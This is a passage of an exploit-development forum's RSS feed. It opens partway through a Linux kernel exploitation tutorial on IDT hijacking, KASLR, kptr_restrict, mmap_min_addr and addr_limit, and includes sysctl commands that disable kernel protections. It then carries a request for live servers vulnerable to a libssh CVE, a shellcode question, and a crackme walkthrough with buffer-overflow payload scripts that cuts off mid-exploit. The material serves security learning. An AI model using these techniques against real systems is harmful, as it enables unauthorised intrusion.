	TSKG(X86_TRAP_DF,		GDT_ENTRY_DOUBLEFAULT_TSS),
#else
	INTG(X86_TRAP_DF,		double_fault),
#endif
	INTG(X86_TRAP_DB,		debug),

#ifdef CONFIG_X86_MCE
	INTG(X86_TRAP_MC,		&amp;machine_check),
#endif

	SYSG(X86_TRAP_OF,		overflow),
#if defined(CONFIG_IA32_EMULATION)
	SYSG(IA32_SYSCALL_VECTOR,	entry_INT80_compat),
#elif defined(CONFIG_X86_32)
	SYSG(IA32_SYSCALL_VECTOR,	entry_INT80_32),
#endif
};
</code></pre>
<p>On <em>x86_32</em> as an example, when an <em>int 0x80</em> is raised. the following happens:</p>
<pre><code class="lang-auto">static __always_inline void do_syscall_32_irqs_on(struct pt_regs *regs)
{
	struct thread_info *ti = current_thread_info();
	unsigned int nr = (unsigned int)regs-&gt;orig_ax;

#ifdef CONFIG_IA32_EMULATION
	ti-&gt;status |= TS_COMPAT;
#endif

	if (READ_ONCE(ti-&gt;flags) &amp; _TIF_WORK_SYSCALL_ENTRY) {
	
		nr = syscall_trace_enter(regs);
	}

	if (likely(nr &lt; IA32_NR_syscalls)) {
		nr = array_index_nospec(nr, IA32_NR_syscalls);
#ifdef CONFIG_IA32_EMULATION
		regs-&gt;ax = ia32_sys_call_table[nr](regs);
#else

		regs-&gt;ax = ia32_sys_call_table[nr](
			(unsigned int)regs-&gt;bx, (unsigned int)regs-&gt;cx,
			(unsigned int)regs-&gt;dx, (unsigned int)regs-&gt;si,
			(unsigned int)regs-&gt;di, (unsigned int)regs-&gt;bp);
#endif
	}

	syscall_return_slowpath(regs);
}

__visible void do_int80_syscall_32(struct pt_regs *regs)
{
	enter_from_user_mode();
	local_irq_enable();
	do_syscall_32_irqs_on(regs);
}
</code></pre>
<p>It would call <em>enter_from_user_mod()</em> to , then enable Interrupt Requests(<em>IRQs</em>) on the <em>current CPU</em>.<br>
Push the saved registers to find the syscall number(<em>EAX</em>), use it as an index in the <em>ia32_sys_call_table</em> array.<br>
Arguments are passed to the handler in <em>registers</em> with the <em>following order</em>: <em>EBX</em>, <em>ECX</em>, <em>EDX</em>, <em>ESI</em>, <em>EDI</em>, <em>EBP</em>.<br>
However, the first object as seen in the <em>idt_table</em> is the <strong>X86_TRAP_DE</strong>(<em>divide error</em>).<br>
This can be seen from <em>GDB</em>, that the first gate within <em>idt_table</em> holds the <em>offset_high</em>, <em>offset_middle</em> and <em>offset_low</em> referencing <em>divide_error</em>. Which would deal with <em>division by 0</em> exceptions.</p>
<pre><code class="lang-auto">(gdb) p idt_table
$1 = 0xffffffff82598000 &lt;idt_table&gt;
(gdb) p/x *(idt_table + 0x10*0)
$2 = {offset_low = 0xb90, segment = 0x10,
      bits = {ist = 0x0, zero = 0, type = 14, dpl = 0, p = 1},
	  offset_middle = 0x8180, offset_high = 0xffffffff, reserved = 0x0}
(gdb) x/8i 0xffffffff81800b90
	0xffffffff81800b90 &lt;divide_error&gt;:		nopl	(%rax)
	0xffffffff81800b93 &lt;divide_error+3&gt;:	pushq	$0xffffffffffffffff
	0xffffffff81800b95 &lt;divide_error+5&gt;:	callq	0xffffffff81801210 &lt;error_entry&gt;
	0xffffffff81800b9a &lt;divide_error+10&gt;:	mov		%rsp,%rdi
	0xffffffff81800b9d &lt;divide_error+13&gt;:	xor		%esi,%esi
	0xffffffff81800b9f &lt;divide_error+15&gt;:	callq	0xffffffff81025d60 &lt;do_devide_error&gt;
	0xffffffff81800ba4 &lt;divide_error+20&gt;:	jmpq	0xffffffff81801310 &lt;error_exit&gt;
</code></pre>
<p>You can see that it’s <em>DPL</em> is zero, that is, an <em>int $0x00</em> from a userland process wouldn’t help reaching it(unlike <em>int $0x03</em>, <em>int $0x04</em> or <em>int $0x80</em>). <em>Gate descriptors</em> are initialized in <em>idt_setup_from_table</em> which calls <em>idt_init_desc</em>:</p>
<pre><code class="lang-auto">idt_setup_from_table(gate_desc *idt, const struct idt_data *t, int size, bool sys)
{
	gate_desc desc;

	for (; size &gt; 0; t++, size--) {
		idt_init_desc(&amp;desc, t);
		write_idt_entry(idt, t-&gt;vector, &amp;desc);
		if (sys)
			set_bit(t-&gt;vector, system_vectors);
	}
}
</code></pre>
<p>And here it is.</p>
<pre><code class="lang-auto">static inline void idt_init_desc(gate_desc *gate, const struct idt_data *d)
{
	unsigned long addr = (unsigned long) d-&gt;addr;

	gate-&gt;offset_low	= (u16) addr;
	gate-&gt;segment		= (u16) d-&gt;segment;
	gate-&gt;bits		= d-&gt;bits;
	gate-&gt;offset_middle	= (u16) (addr &gt;&gt; 16);
#ifdef CONFIG_X86_64
	gate-&gt;offset_high	= (u32) (addr &gt;&gt; 32);
	gate-&gt;reserved		= 0;
#endif
}
</code></pre>
<p>This could be used by the attacker, such as by getting the IDT address using the SIDT instruction, and looking for a specific handler in the list, incrementing <em>offset_high</em> would set it to <em>0</em>.</p>
<pre><code class="lang-bash">As we said above, we're going to use the IDT and overwrite one of its
entries (more precisely a Trap Gate, so that we're able to hijack an
exception handler and redirect the code-flow towards userspace).
Each IDT entry is 64-bit (8-bytes) long and we want to overflow the
'base_offset' value of it, to be able to modify the MSB of the exception
handler routine address and thus redirect it below PAGE_OFFSET
(0xc0000000) value.
</code></pre>
<p>~ <a href="http://phrack.org/issues/64/6.html" rel="noopener nofollow ugc">Phrack</a></p>
<h5>KSPP:</h5>
<p>This is a protection that appeared starting from <em>4.8</em>, it’s name is a short for: <em>“Kernel self-protection project”</em>, It does provide additional checks on <strong>copy_to_user()</strong> and <strong>copy_from_user()</strong> to prevent classic buffer-overflows bugs from happening, by checking the saved compile-time buffer size and making sure it fits. if not, abort and prevent any possible exploitation from happening.</p>
<pre><code class="lang-bash">root@Nwwz:~/mod# cd /usr/src
root@Nwwz:/usr/src# cd linux-4.17.2
root@Nwwz:/usr/src/linux-4.17.2# cd include
root@Nwwz:/usr/src/linux-4.17.2/include# nano uaccess.h
</code></pre>
<p>We can directly see a check that’s <em>likely to be 1</em>, before proceeding to the <em>copy operation</em>:</p>
<pre><code class="lang-auto">static __always_inline unsigned long __must_check
copy_from_user(void *to, const void __user *from, unsigned long n)
{
	if (likely(check_copy_size(to, n, false)))
		n = _copy_from_user(to, from, n);
	return n;
}

static __always_inline unsigned long __must_check
copy_to_user(void __user *to, const void *from, unsigned long n)
{
	if (likely(check_copy_size(from, n, true)))
		n = _copy_to_user(to, from, n);
	return n;
}
</code></pre>
<p>The check function is as follows, it does first check the compile-time size against the requested size, and calls <em>__bad_copy_from()</em> or <em>__bad_copy_to()</em> depending on the boolean <em>is_source</em> if it seems like an overflow is possible, which is <em>unlikely</em> of course(<em>or not?</em>), it then returns false.<br>
If not, it does call <em>check_object_size()</em> and returns true.</p>
<pre><code class="lang-auto">extern void __compiletime_error("copy source size is too small")
__bad_copy_from(void);
extern void __compiletime_error("copy destination size is too small")
__bad_copy_to(void);

static inline void copy_overflow(int size, unsigned long count)
{
	WARN(1, "Buffer overflow detected (%d &lt; %lu)!\n", size, count);
}

static __always_inline bool
check_copy_size(const void *addr, size_t bytes, bool is_source)
{
	int sz = __compiletime_object_size(addr);
	if (unlikely(sz &gt;= 0 &amp;&amp; sz &lt; bytes)) {
		if (!__builtin_constant_p(bytes))
			copy_overflow(sz, bytes);
		else if (is_source)
			__bad_copy_from();
		else
			__bad_copy_to();
		return false;
	}
	check_object_size(addr, bytes, is_source);
	return true;
}
</code></pre>
<p>This function is simply just a wrapper around <em>__check_object_size()</em>.</p>
<pre><code class="lang-auto">#ifdef CONFIG_HARDENED_USERCOPY
extern void __check_object_size(const void *ptr, unsigned long n,
					bool to_user);

static __always_inline void check_object_size(const void *ptr, unsigned long n,
					      bool to_user)
{
	if (!__builtin_constant_p(n))
		__check_object_size(ptr, n, to_user);
}
#else
static inline void check_object_size(const void *ptr, unsigned long n,
				     bool to_user)
{ }
#endif
</code></pre>
<p>Additional checks are provided here in <em>__check_object_size()</em>, and as the comment says, not a <em>kernel .text</em> address, not a <em>bogus</em> address and is a safe <em>heap or stack object</em>.</p>
<pre><code class="lang-auto">void __check_object_size(const void *ptr, unsigned long n, bool to_user)
{
	if (static_branch_unlikely(&amp;bypass_usercopy_checks))
		return;

	if (!n)
		return;

	check_bogus_address((const unsigned long)ptr, n, to_user);

	check_heap_object(ptr, n, to_user);

	switch (check_stack_object(ptr, n)) {
	case NOT_STACK:
		break;
	case GOOD_FRAME:
	case GOOD_STACK:
		return;
	default:
		usercopy_abort("process stack", NULL, to_user, 0, n);
	}

	check_kernel_text_object((const unsigned long)ptr, n, to_user);
}
EXPORT_SYMBOL(__check_object_size);
</code></pre>
<p>With this, it does provide enough to block and kill classic buffer-overflow bugs, this can be disabled by <em>commenting the check</em> and <em>recompiling a module</em>.</p>
<h5>KASLR:</h5>
<p>Stands for <em>Kernel Address Space Layout Randomization</em>.<br>
It’s similiar to the ASLR on <em>userspace</em> which protects the <em>stack</em> and <em>heap addresses</em> from being at the <em>same location</em> in two different runs(<em>unless the attacker gets lucky <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></em>). PIE too since it does target the <em>main binary segments</em> which are <em>text</em>, <em>data</em> and <em>bss</em>.</p>
<p>This protection randomizes the kernel segments(<em>Exception table</em>, <em>text</em>, <em>data</em>…) at each <em>restart</em>(<em>boot</em>), we’ve previously disabled it by using the <em>nokaslr</em> at the <em>kernel command line</em>.<br>
In order to experiment on it, this was removed and specific symbols in <em>/proc/kallsyms</em> were then fetched on two different runs.<br>
First run:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/7/79bda735ca6a331460d68ebc005b50152ff41588.png" alt="image" data-base62-sha1="hmY6rBts39KAyi3lwdELezIKy8w" width="575" height="81"><br>
Second run:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/9/973fcf58caa0e7f80b97352743743d59c9fd10f6.png" alt="image" data-base62-sha1="lA0OeuD5CE6XEqPtGRHGlLhto8u" width="574" height="82"><br>
This shows that addresses are randomly assigned on boottime to <em>_stext</em> and <em>_sdata</em>, whereas their end is just the <em>start address</em> plus a <em>size</em> which doesn’t change in this case(<em>0x21dc0</em> for <em>.data</em>, <em>0x6184d1</em> for <em>.text</em>), note that <em>.data</em> is on a constant distance from <em>.text</em>.<br>
So if the attacker gets the <em>.text base address</em>(<em>which is the result of a <strong>leak</strong></em>), he can know the location of all the <em>kernel symbols</em> even with <em>no access</em> to <em>kallsyms</em> using <em>RVAs</em>(<em>or offsets</em>), but he’ll have to compile the <em>target kernel</em> in his box to get them.<br>
This is for example used when <em>SMEP</em> is on and one has to go for <em>ROP</em> to disable it first, and then redirect execution to a shellcode placed in <em>userspace</em>(<em>&lt; TASK_SIZE</em>).</p>
<h5>kptr_restrict:</h5>
<p>This protection prevents <em>kernel addresses</em> from being exposed to the attacker. It does stop <em>%pK</em> format from dumping an address, and it’s work depends on the <em>kptr_restrict</em> value(0, 1 or 2).</p>
<pre><code class="lang-auto">Kernel Pointers:

	%pK	0x01234567 or 0x0123456789abcdef

	For printing kernel pointers which should be hidden from unprivileged
	users. The behaviour of %pK depends on the kptr_restrict sysctl - see
	Documentation/sysctl/kernel.txt for more details.
</code></pre>
<p>This can be seen in <em>kprobe_blacklist_seq_show()</em> which performs a <em>check</em> with a call to <em>kallsyms_show_value()</em>, depending on it, it <em>would</em> or <em>would not</em> print the <em>start</em> and <em>end</em> addresses.</p>
<pre><code class="lang-auto">static int kprobe_blacklist_seq_show(struct seq_file *m, void *v)
{
	struct kprobe_blacklist_entry *ent =
		list_entry(v, struct kprobe_blacklist_entry, list);

	if (!kallsyms_show_value())
		seq_printf(m, "0x%px-0x%px\t%ps\n", NULL, NULL,
			   (void *)ent-&gt;start_addr);
	else
		seq_printf(m, "0x%px-0x%px\t%ps\n", (void *)ent-&gt;start_addr,
			   (void *)ent-&gt;end_addr, (void *)ent-&gt;start_addr);
	return 0;
}
</code></pre>
<p>What <em>kallsyms_show_value()</em> does is shown here:</p>
<pre><code class="lang-auto">int kallsyms_show_value(void)
{
	switch (kptr_restrict) {
	case 0:
		if (kallsyms_for_perf())
			return 1;
	case 1:
		if (has_capability_noaudit(current, CAP_SYSLOG))
			return 1;
	default:
		return 0;
	}
}
</code></pre>
<p>If <em>kptr_restrict</em> value is 0, it does call <em>kallsyms_for_perf()</em> to check if <em>sysctl_perf_event_paranoid</em> value is smaller or equal to 1, returns 1 if true.<br>
If it’s 1, it checks if <em>CAP_SYSLOG</em> is within the user’s capabilities, if true, it returns 1.<br>
Otherwise, it returns 0.</p>
<p>Disabling this protection can be done by setting <em>/proc/sys/kernel/kptr_restrict</em> content to <strong>0</strong>.<br>
Or using <em>sysctl</em> to do that:</p>
<pre><code class="lang-auto">sysctl -w kernel.kptr_restrict=0
</code></pre>
<p>But watchout for <em>perf_event_paranoid</em> too, if it’s <em>&gt; 1</em>, then it needs to be adjusted.<br>
This is an example on the default kernel run by my <em>Debian VM</em>:</p>
<pre><code class="lang-bash">user@Nwwz:~$ cd /proc/self
user@Nwwz:/proc/self$ cat stack
[&lt;ffffffff81e7c869&gt;] do_wait+0x1c9/0x240
[&lt;ffffffff81e7d9ab&gt;] SyS_wait4+0x7b/0xf0
[&lt;ffffffff81e7b550&gt;] task_stopped_code+0x50/0x50
[&lt;ffffffff81e03b7d&gt;] do_syscall_64+0x8d/0xf0
[&lt;ffffffff8241244e&gt;] entry_SYSCALL_64_after_swapgs+0x58/0xc6
[&lt;ffffffffffffffff&gt;] 0xffffffffffffffff
</code></pre>
<p>However, in the <em>4.17</em> kernel, we get this, because of <em>perf_event_paranoid</em>:</p>
<pre><code class="lang-bash">root@Nwwz:~# cd /proc/self
root@Nwwz:/proc/self# cat stack
[&lt;0&gt;] do_wait+0x1c9/0x240
[&lt;0&gt;] kernel_wait4+0x8d/0x140
[&lt;0&gt;] __do_sys_wait4+0x95/0xa0
[&lt;0&gt;] do_syscall_64+0x55/0x100
[&lt;0&gt;] entry_SYSCALL_64_after_hwframe+0x44/0xa9
[&lt;0&gt;] 0xffffffffffffffff
root@Nwwz:/proc/self# cat /proc/sys/kernel/kptr_restrict
0
root@Nwwz:/proc/self# cat /proc/sys/kernel/perf_event_paranoid
2
</code></pre>
<h5>mmap_min_addr:</h5>
<p>The <em>mm_struct</em> within <em>task_struct</em> holds an operation function called <em>get_unmapped_area</em>.</p>
<pre><code class="lang-auto">struct mm_struct {
...
#ifdef CONFIG_MMU
		unsigned long (*get_unmapped_area) (struct file *filp,
				unsigned long addr, unsigned long len,
				unsigned long pgoff, unsigned long flags);
#endif
...
}
</code></pre>
<p>It is then extracted in <em>get_unmapped_area()</em>, which tries to get it from the <em>mm</em>(<em>mm_struct</em>), before checking it’s <em>file</em> and it’s <em>file_operations</em> or if it has the <em>MAP_SHARED</em> flag and assign <em>shmem_get_unmapped_area()</em> to it.<br>
However, within the <em>mm_struct</em>, the default value of <em>get_unmapped_area</em> is the <em>arch specific</em> function.<br>
This function does search for a <em>large enough memory block</em> to satisfy the <em>request</em>, but before returning the <em>addr</em>, it does check if it’s <strong>bigger or equal</strong> to <em>mmap_min_addr</em>, which means that any address <em>below it</em> will <strong>not be given</strong>, this prevents <em>NULL pointer dereference</em> attack from happening(no mmaping <em>NULL address</em>, <em>nothing</em> will be stored there(<em>shellcode, pointers…</em>)).</p>
<p>Disabling this protection can be done by setting <em>/proc/sys/vm/mmap_min_addr</em> content to <strong>0</strong>, or using <em>sysctl</em> like before.</p>
<pre><code class="lang-auto">sysctl -w vm.mmap_min_addr=0
</code></pre>
<h5>addr_limit:</h5>
<p>The <strong>thread</strong>(<em>thread_struct</em>) within the <em>task_struct</em> contains some important fields, amongst them, is the <em>addr_limit</em>.</p>
<pre><code class="lang-auto">typedef struct {
	unsigned long		seg;
} mm_segment_t;

struct thread_struct {
	...
	mm_segment_t		addr_limit;

	unsigned int		sig_on_uaccess_err:1;
	unsigned int		uaccess_err:1;
	...
};
</code></pre>
<p>This can be read with a call to <em>get_fs()</em>, changed with <em>set_fs()</em>:</p>
<pre><code class="lang-auto">#define MAKE_MM_SEG(s)	((mm_segment_t) { (s) })

#define KERNEL_DS	MAKE_MM_SEG(-1UL)
#define USER_DS 	MAKE_MM_SEG(TASK_SIZE_MAX)

#define get_ds()	(KERNEL_DS)
#define get_fs()	(current-&gt;thread.addr_limit)
static inline void set_fs(mm_segment_t fs)
{
	current-&gt;thread.addr_limit = fs;
	
	set_thread_flag(TIF_FSCHECK);
}
</code></pre>
<p>When <em>userspace</em> likes to reach an address, it is checked against this first, so overwritting it with -1UL(<em>KERNEL_DS</em>) would let you access(<em>read or write</em>) to <em>kernelspace</em>.</p>
<p>This was the introduction, I’ve noticed that it has grown bigger than I expected, so I stopped, and removed parts about <a href="https://en.wikipedia.org/wiki/Kernel_page-table_isolation" rel="noopener nofollow ugc">protections</a>, <a href="https://meltdownattack.com/meltdown.pdf" rel="noopener nofollow ugc">side-channel</a> <a href="https://arxiv.org/pdf/1901.01161.pdf" rel="noopener nofollow ugc">attacks</a> and others.</p>
<p>Starting this was possible, thanks to: <a class="mention" href="https://0x00sec.org/u/_py">@_py</a>(DA BEST), <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a>, <a class="mention" href="https://0x00sec.org/u/anon79434934">@anon79434934</a>, <a class="mention" href="https://0x00sec.org/u/4w1il">@4w1il</a>, <a class="mention" href="https://0x00sec.org/u/ricksanchez">@ricksanchez</a> and <a class="mention" href="https://0x00sec.org/u/leeky">@Leeky</a>.<br>
See y’all in <em>part 1</em>, peace.</p>
<p>“<em>nothing is enough</em>, <em>search more to learn more</em>”.<br>
~ exploit</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585</link>
          <pubDate>Thu, 14 Feb 2019 17:42:36 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-11585</guid>
          <source url="https://0x00sec.org/t/point-of-no-c3-linux-kernel-exploitation-part-0/11585.rss">Point of no C3 | Linux Kernel Exploitation - Part 0</source>
        </item>
        <item>
          <title>Libssh any vulnerable server (CVE-2018-10933)?</title>
          <dc:creator><![CDATA[Virgula]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>I’m trying to exploit libssh vulnerability and ignoring an installation of libssh in local do you know an online server to make tries with this vulnerability?</p>
            <p><small>35 posts - 7 participants</small></p>
            <p><a href="https://0x00sec.org/t/libssh-any-vulnerable-server-cve-2018-10933/9124">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/libssh-any-vulnerable-server-cve-2018-10933/9124</link>
          <pubDate>Tue, 23 Oct 2018 17:05:59 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-9124</guid>
          <source url="https://0x00sec.org/t/libssh-any-vulnerable-server-cve-2018-10933/9124.rss">Libssh any vulnerable server (CVE-2018-10933)?</source>
        </item>
        <item>
          <title>How can I learn to form strings in shellcodes?</title>
          <dc:creator><![CDATA[yogi4you]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>I am completely new to shellcode development. I am fairly good with assembly and C. It contains character string like,</p>
<p>char shellcode[] =<br>
“\x31\xc0\xeb\x13\x5e\x6a\x0f\x56\x6a\x01\xb0\x04\x50\xcd\x80”<br>
“\x31\xc0\x50\x50\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x48\x65”<br>
“\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x20\x21\x0a”;</p>
<p>What is it? I don’t seem to understand it. And how can I learn to create it for use. Can you throw some light?</p>
            <p><small>5 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/how-can-i-learn-to-form-strings-in-shellcodes/8992">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/how-can-i-learn-to-form-strings-in-shellcodes/8992</link>
          <pubDate>Fri, 12 Oct 2018 04:49:32 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-8992</guid>
          <source url="https://0x00sec.org/t/how-can-i-learn-to-form-strings-in-shellcodes/8992.rss">How can I learn to form strings in shellcodes?</source>
        </item>
        <item>
          <title>Bypass Data Execution Protection (DEP)</title>
          <dc:creator><![CDATA[Sk0xic]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>Hey folks! this topic details how to overflow a buffer, bypass DEP (Data Execution Prevention) and take control of the executable</p>
<h2>Recommended Prerequisites</h2>
<ul>
<li>C/C++ language, a basic level would be fine</li>
<li>x86 Intel Assembly</li>
<li>Familiarity with Buffer Overflow</li>
<li>Debuggers/Disassembly</li>
</ul>
<h2>The binary</h2>
<p><a href="https://ufile.io/4dokb" rel="noopener nofollow ugc">File</a><br>
<a href="https://www.virustotal.com/#/file/65d44e69d8b7ef29d3a28819de4774c422f8a88758ee805eb11b2cbc081ec0a2/detection" rel="noopener nofollow ugc">Virustotal</a></p>
<p>Okay, first thing we need to do is see what the executable brings us, so we run it.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/6/6c6781b77c5c3f335a688b69925f81776db4a4d4.png" alt="r_opt" data-base62-sha1="fsZkoiT1A4QlwNxgKozQjjGFbgg" width="500" height="87"></p>
<p>Here we see that it is asking for a file <em><strong>file.dat</strong></em> but as it does not exist it tells us that <strong>it cannot be opened</strong>, Once created we see that it shows us a message with 3 values at 0 that seem to correspond to 3 variables (cookie, cookie2 and size) and nothing else.</p>
<p>Since we don’t know what it does, let’s take a look at it.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/1/189cffd80d6fe5cf6ac2b791651f8f142bc1d574.png" alt="function1_opt(2)" data-base62-sha1="3vJPoq3QbuuHL7ScLivt0Gg6PDC" width="690" height="317"></p>
<p>This function has 5 variables, 4 of which are initialized at 0 and one at 32h (“2”), there is a pointer to <strong>LoadLibrary</strong> that is stored in 0x10103024 then makes a fopen to “fichero.dat” file in binary read mode, stores the FILE pointer in 0x10103020 and finally checks if it exists, if it does not exist it will go to 0x101010d3 and closes (as we saw before) and if it exists it goes to 0x101010e9, let’s look there</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/ace90a9e6bd64f3dcc7bf3fb3277f029b572f38d.png" alt="function2_opt(1)" data-base62-sha1="oFDpFme9upt3ffYFMo4MJ0ggDG5" width="350" height="391"></p>
<p>Ok, in this procedure it first reads 4 bytes of fichero.dat with <strong>fread</strong> and stores them in a pointer to a block of memory <a href="https://www.tutorialspoint.com/c_standard_library/c_function_fread.htm" rel="noopener nofollow ugc">look</a> (<strong>ebp-c</strong>), <strong>fread</strong> returns the total number of elements read and stores it in <strong>ebp-8</strong>, it does fread of 4 bytes again for the file and stores them in a pointer to <strong>ebp-10</strong> then it does it one more time of 1 byte and stores it in a pointer to <strong>ebp-1</strong>, finally it compares this byte with [ebp-14] which is 32h (“2”) and if it is less than or equal (<strong>jle</strong>) it goes to 0x10101155 if it doesn’t, show a message saying “Nos fuimos al carajo” (We’re going to fuck off) and it closes.</p>
<p>Then we write in the file 8 bytes + the correct byte (“2”) and we enter 0x10101155, for example:</p>
<blockquote>
<p>1234 + 5678 + <strong>2</strong></p>
</blockquote>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/6/66344b19febddcfbd31ab399baa3b94aa2115d3f.png" alt="function3_opt" data-base62-sha1="eA8JSzMDHegRYIaKfejYJ7xiTz9" width="400" height="300"></p>
<p>Well, here it pushes the saved bytes with <strong>fread</strong> and prints them, allocates 50 bytes (32h) of memory with <strong>malloc</strong>, stores the pointer to the allocated memory in <strong>ebp-1c</strong> then push the first 8 bytes of “<strong>fichero.dat</strong>” to 0x10101010, let’s look over there</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/08f2bede9b3867bfb9e1a8f81799d69c2ccb36dd.png" alt="function4_opt" data-base62-sha1="1h9TMKzfNagNhDwFlymbPqz993n" width="600" height="253"></p>
<p>Okay, what it does here is it takes the first 4 bytes of <em>fichero.dat</em> and adds them to the following 4 bytes then the result is compared to <strong>58552433h</strong>, if the condition is correct, loads “<strong>pepe.dll</strong>”, then let’s make sure the condition is met (as it is <em>little endian</em> we have to put the bytes at backwards)</p>
<p>As not all characters meet the condition as “0” (30h) +"(" (28h) = 58h (1 byte correct) we do a script that does it and ready</p>
<pre><code class="lang-python">data = "\x21\x1210" + "\x12\x12$(" + "2"
with open("fichero.dat", "w") as file:
	file.write(data)
</code></pre>
<p>Okay, this must meet the condition, let’s see.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/3f79643fd69aef534b59525d0d1fa1049a4f78b2.png" alt="check58_opt" data-base62-sha1="93w9YEtENuEQuPxkkCk5dF3HrfI" width="600" height="330"></p>
<p>Well, let’s see what’s it now.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/0c35cb19c480d636f73bf8fc4a4d8f683528495e.png" alt="buffer_opt" data-base62-sha1="1K0YQt8SI2FuwBk4jwt0NLUdqTI" width="405" height="369"></p>
<p>Once we leave 0x10101010 we see that it reads [ebp-1] bytes of <strong>fichero.dat</strong> with <strong>fread</strong> and stores it in a buffer pointing to (<strong>ebp-54</strong>), <strong>Okay, here’s a buffer overflow, let’s analyze it.</strong></p>
<p>First we saw that the ninth byte of “<strong>fichero.dat</strong>” was stored in <strong>[ebp-1]</strong>, then compared to <strong>[ebp-14] (“2”)</strong></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a8c47addb12b881b4bdc6f32661b908e2dbc6e40.png" alt="anal1_opt(1)" data-base62-sha1="o4ZaCLRUV164loEyk1lz5zc0FLq" width="405" height="239"></p>
<p>Well, now we see that that byte (<strong>[ebp-1]</strong>) is used as size of <strong>fread</strong> that will store that number of bytes (size) in a buffer (<strong>ebp-54</strong>) of 52 bytes, as the nearest variable is <strong>ebp-20</strong>, [ebp-54] - [ebp-20] = [ebp-34], so 34h (52d), we can also see it in the IDA stack, <em>right click</em> -&gt; <em>array</em> -&gt; <em>ok</em></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/e/e24eb0196e97a1b89f9bad6d8e7cce4d86f2feae.png" alt="buffer_opt(1)" data-base62-sha1="wi0uLWHKXzNQrctiOQ3SIORoLng" width="405" height="369"></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/22047c33464df41a61806cb2db7c255de0f6d448.png" alt="idastack_opt(1)" data-base62-sha1="4QVQi1ZsAWTfhNTkgIeozcEUjRC" width="405" height="375"></p>
<p>Okay, knowing all that, how could we overflow the buffer?</p>
<p><strong>[ebp-1]</strong> is the ninth byte of <strong>fichero.dat</strong>, the size of <strong>fread</strong> for store in the buffer <strong>[ebp-54]</strong> and must also be less than or equal to 32h (“2”).</p>
<p>So we know that negative numbers in hexadecimal are higher in decimal, so if we put a negative number in hexadecimal it would allow us to enter more bytes than allowed (52d) and this is because it is signed (<strong>jle</strong>)</p>
<pre><code>0x10101139 movsx ecx,  byte ptr ss:[ebp-1]
0x1010113d cmp ecx,    dword ptr ss:[ebp-14]
0x10101140 jle         stack9b.10101155
</code></pre>
<p>Let’s try to get to the edge of the buffer and at the same time overflowing 2 bytes of the <strong>fread</strong> stipulation <strong>(50 bytes, 32h)</strong>.</p>
<pre><code class="lang-python">data = "\x21\x1210" + "\x12\x12$(" + "\xff" + "A" * 52

with open("fichero.dat", "w") as file:
	file.write(data)
</code></pre>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/f2d8bc728b116fe39fac839fa6c2d944c917452f.png" alt="ff_opt" data-base62-sha1="yEjTYytrBpoizGxjHTQ6ysqYCIL" width="405" height="175"><br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/f/fc94ea6662ffc8da6d8b0e3b01d16d4cd75b898e.png" alt="ffstack_opt" data-base62-sha1="A2rn74xZke3E3EkFn1TiPxPG7Nk" width="360" height="266"></p>
<p><strong>Cool!!!</strong> Let’s see what else there is to see if we can control the <strong>retn</strong>.</p>
<p>Well, now there is a procedure where it copy the buffer bytes <strong>[ebp-54]</strong> for the block in memory allocated by malloc <strong>[ebp-1c]</strong></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/9/93d0775b279dd23af7795c045a30c39435be3ab2.png" alt="nowrite_opt(1)" data-base62-sha1="l5CP9jwU5xtGsiGUHh5LtJaFoIO" width="690" height="402"></p>
<p>So, if I fill out <strong>[ebp-1c]</strong> with <strong>“\x41x41x41\x41”</strong> he won’t be able to write because it’s not a valid address, let’s find one that is.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/2dfc792951337d64ee81486726061ae00e7ed565.png" alt="ywrite_opt" data-base62-sha1="6yOphatOisdi5mKfsOUNpS5S9HT" width="600" height="137"></p>
<p>All right, let’s check the stack, see how many bytes it takes to get to the start of <strong>retn</strong> and control it.</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/7681c7aac081636d910c82cbb720d7ecd2b49ff5.png" alt="88b_opt" data-base62-sha1="gUmopEQNuadZcWG0ajcgyUlu0p7" width="600" height="460"></p>
<p>Okay, let’s set up our exploit</p>
<pre><code class="lang-python">import subprocess

